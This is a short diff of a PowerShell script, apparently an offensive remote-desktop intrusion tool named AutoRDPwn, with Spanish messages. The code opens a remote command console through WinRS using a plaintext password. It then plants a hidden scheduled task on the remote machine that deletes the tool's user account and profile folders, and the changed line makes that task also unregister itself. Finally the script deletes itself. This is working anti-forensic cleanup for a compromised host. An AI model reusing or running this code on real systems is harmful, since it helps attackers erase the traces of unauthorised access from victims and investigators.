@@ -283,9 +283,8 @@ $PlainTextPassword = ConvertFrom-SecureToPlain $password
 if ($console){ Clear-Host ; Write-Host '>> Consola semi-interactiva en equipo remoto <<' ; Write-Host "" ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
 else { Write-Host "Algo salió mal, cerrando el programa.." -ForegroundColor Red ; sleep -milliseconds 3000 }
 if ($hash){ invoke-command -session $RDP[0] -scriptblock { 
-$action = New-ScheduledTaskAction -Execute 'Powershell.exe -NoProfile -WindowStyle Hidden net user AutoRDPwn /delete ; rmdir C:\Users\AutoRDPwn* -Confirm:$false -Force'
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe -NoProfile -WindowStyle Hidden net user AutoRDPwn /delete ; rmdir C:\Users\AutoRDPwn* -Confirm:$false -Force ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false'
 $time = Get-Date -Format t
 $trigger =  New-ScheduledTaskTrigger -Once -At $time
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" 
-Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false }}
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" }}
 $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript
